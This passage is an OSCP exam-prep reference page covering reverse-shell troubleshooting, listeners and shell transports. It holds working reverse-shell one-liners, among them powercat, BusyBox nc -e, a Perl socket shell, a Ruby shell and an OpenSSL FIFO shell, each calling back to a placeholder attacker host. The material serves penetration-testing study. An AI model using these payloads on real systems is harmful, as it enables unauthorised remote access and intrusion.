+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Interpretation / next action</th></tr></thead><tbody><tr><td>Direct command fails</td><td>Repair exploit/request/parser before payload work</td></tr><tr><td>Direct command succeeds, no SYN</td><td>Correct payload, LHOST, interpreter or egress</td></tr><tr><td>Listener absent/wrong bind</td><td>Bind before trigger and verify with <code>ss</code></td></tr><tr><td>Connection to raw listener, no I/O</td><td>Check staged payload or buffering</td></tr><tr><td>Immediate disconnect</td><td>Check process crash, handler/payload match and exit behavior</td></tr><tr><td>Shell lacks job control</td><td>Spawn PTY and repair local terminal state</td></tr><tr><td>Arrow keys/control characters break</td><td>Correct PTY, raw mode and <code>TERM</code></td></tr><tr><td>Windows shell output is garbled</td><td>Check code page/encoding and payload channel</td></tr><tr><td>File vanishes after transfer</td><td>Gather quarantine/security-control evidence</td></tr><tr><td>Works once, not again</td><td>Check single-use listener, service crash, cleanup and trigger state</td></tr></tbody></table>
+<h2 id="exam-boundary">Exam boundary</h2>
+<p>The current OSCP+ guide permits <code>msfvenom</code> and <code>exploit/multi/handler</code> against all targets, but Meterpreter and Metasploit Auxiliary/Exploit/Post modules become locked to one selected target. Metasploit pivoting is prohibited. AI chatbots are prohibited during the actual exam. Recheck the current guide before a mock or exam.</p>
+<h2 id="powercat--windows-powershell-shell-transport">Powercat — Windows PowerShell shell transport</h2>
+<p>Use when a reviewed powercat.ps1 is available and the current PowerShell context permits it. Keep the listener and target connection direction explicit.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Attacker: listener
+nc -lvnp LPORT
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell"># Target: load the local reviewed script and connect back
+. .\powercat.ps1
+powercat -c LHOST -p LPORT -e cmd.exe
+</code></pre>
+<p>Read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. Script-policy/AV/runtime failures → use the existing native transfer and shell alternatives. Powercat does not repair a missing callback route.</p>
+<p>Sources: <a href="https://github.com/besimorhino/powercat">upstream 1</a>.</p>
+<h2 id="penelope-or-pwncat-cs--handle-an-existing-shell-and-move-files">Penelope or pwncat-cs — handle an existing shell and move files</h2>
+<p>Choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes Linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Basic reverse-shell listener with pwncat-cs
+pwncat-cs -lp LPORT
+
+# Alternative: open Penelope's current CLI help, then select its listener port
+penelope --help
+penelope -p LPORT
+</code></pre>
+<p>In pwncat-cs's local prompt, use only the operation needed:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">download /REMOTE/FILE ./LOCAL_FILE
+upload ./LOCAL_FILE /REMOTE/FILE
+back
+</code></pre>
+<p>For Penelope, F12 detaches a PTY session to its menu; <code>interact SESSION_ID</code> returns to it. Verify uploaded bytes and the target identity after reconnecting. Optional modules can fetch/run additional tools or exploitation features; they are separate actions and are not part of this basic handler workflow.</p>
+<p>Sources: <a href="https://github.com/brightio/penelope">upstream 1</a> · <a href="https://github.com/calebstewart/pwncat">upstream 2</a>.</p>
+<h2 id="keep-listeners-and-long-running-checks-in-tmux">Keep listeners and long-running checks in tmux</h2>
+<p>Use on your own attack workstation to retain a working listener or pspy view while switching terminals. A tmux pane is not a second target shell unless you create/connect one.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">tmux new-session -s oscp
+tmux list-sessions
+tmux attach-session -t oscp
+
+# Capture existing pane history from another terminal; not a full session recorder
+tmux capture-pane -p -S - -t oscp:0.0 > pane-history.txt
+</code></pre>
+<p>Within tmux: Ctrl-b then d detaches; Ctrl-b then c creates a window; Ctrl-b then w selects one. Read: scrollback capture only contains retained history. Continue saving raw scanner/tool output and proof explicitly rather than relying on terminal history alone.</p>
+<p>Sources: <a href="https://github.com/tmux/tmux/blob/master/tmux.1">upstream 1</a>.</p>
+<h2 id="aspx-handler-check-before-generating-a-windows-payload">ASPX handler check before generating a Windows payload</h2>
+<p>Use only when you can place a file at a path served by an ASP.NET handler. A static upload on IIS, classic ASP, PHP or ASP.NET Core does not automatically execute ASPX pages.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-aspx">&#x3C;%@ Page Language="C#" %>
+&#x3C;% Response.Write(System.Security.Principal.WindowsIdentity.GetCurrent().Name); %>
+</code></pre>
+<p>Save as a uniquely named test ASPX file, upload through the verified write primitive, then request its actual stored URL:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">curl -i http://TARGET:PORT/ACTUAL_PATH/probe.aspx
+</code></pre>
+<p>Read: the process identity, rather than literal source or a file download, verifies server-side handling. Then use the matching ASPX/Windows payload generation already covered here, with the correct runtime/architecture and return route. Delete the test artifact after validation.</p>
+<p>Sources: <a href="https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)">upstream 1</a>.</p>
+<h2 id="shell-alternatives-when-the-installed-runtime-changes">Shell alternatives when the installed runtime changes</h2>
+<p>Choose one matching the actual target runtime and a reachable listener. These alternatives retain the current execution identity; they do not create privilege by themselves.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Attacker
+nc -lvnp LPORT
+
+# Target: BusyBox build with the optional nc -e feature
+busybox nc -e /bin/sh LHOST LPORT
+
+# Target: Perl with Socket support
+perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"&#x3C;&#x26;S");open(STDOUT,">&#x26;S");open(STDERR,">&#x26;S");exec("/bin/sh -i");'
+
+# Target: Ruby with its socket library
+ruby -rsocket -e 's=TCPSocket.new("LHOST",LPORT);exec("/bin/sh","-i",in:s,out:s,err:s)'
+</code></pre>
+<p>Read: check hostname/id after connecting, then use the existing PTY stabilization steps. Missing runtime, unsupported BusyBox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. A noninteractive process can execute correctly while lacking a terminal.</p>
+<p>Sources: <a href="https://busybox.net/downloads/BusyBox.html">upstream 1</a> · <a href="https://perldoc.perl.org/Socket">upstream 2</a> · <a href="https://docs.ruby-lang.org/en/master/Kernel.html#method-i-exec">upstream 3</a>.</p>
+<h2 id="openssl-transport-when-a-tls-callback-is-useful">OpenSSL transport when a TLS callback is useful</h2>
+<p>Use when OpenSSL exists on both ends and the actual route permits the chosen listener. TLS is a transport choice, not a fix for an unreachable destination.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Attacker: create a short-lived local test certificate, then listen
+openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
+  -subj '/CN=listener' -keyout listener.key -out listener.crt
+openssl s_server -quiet -accept LPORT -cert listener.crt -key listener.key
+
+# Target: connect a shell through the FIFO and TLS client
+mkfifo /tmp/shell-pipe
+/bin/sh -i &#x3C; /tmp/shell-pipe 2>&#x26;1 | \
+  openssl s_client -quiet -connect LHOST:LPORT > /tmp/shell-pipe
+</code></pre>
+<p>Read: verify the session identity and preserve the working channel. This example does not authenticate the listener certificate. A TLS handshake failure, a refused socket and a missing shell are different failures. Use a unique writable FIFO path and remove the test pipe after the session.</p>
+<p>Sources: <a href="https://docs.openssl.org/master/man1/openssl-s_server/">upstream 1</a> · <a href="https://docs.openssl.org/master/man1/openssl-s_client/">upstream 2</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200 pp257-259, Ch 13-14 pp375-415, Ch 15 pp416-441 selectively, Ch 19 PTY examples and Ch 21.2 pp671-683</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">Current OSCP+ Body of Knowledge</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">Current OSCP+ exam guide</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md">Metasploit msfvenom documentation</a></li>
+<li><a href="https://nmap.org/ncat/guide/ncat-usage.html">Ncat basic usage</a> and <a href="https://nmap.org/ncat/guide/ncat-exec.html">command execution</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1">PowerShell command-line documentation</a></li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps">Microsoft Defender <code>Get-MpComputerStatus</code></a></li>
+<li><a href="https://lizajose.github.io/getSH/useful-stuff">getSH Useful Stuff and Tool Cheatsheet</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
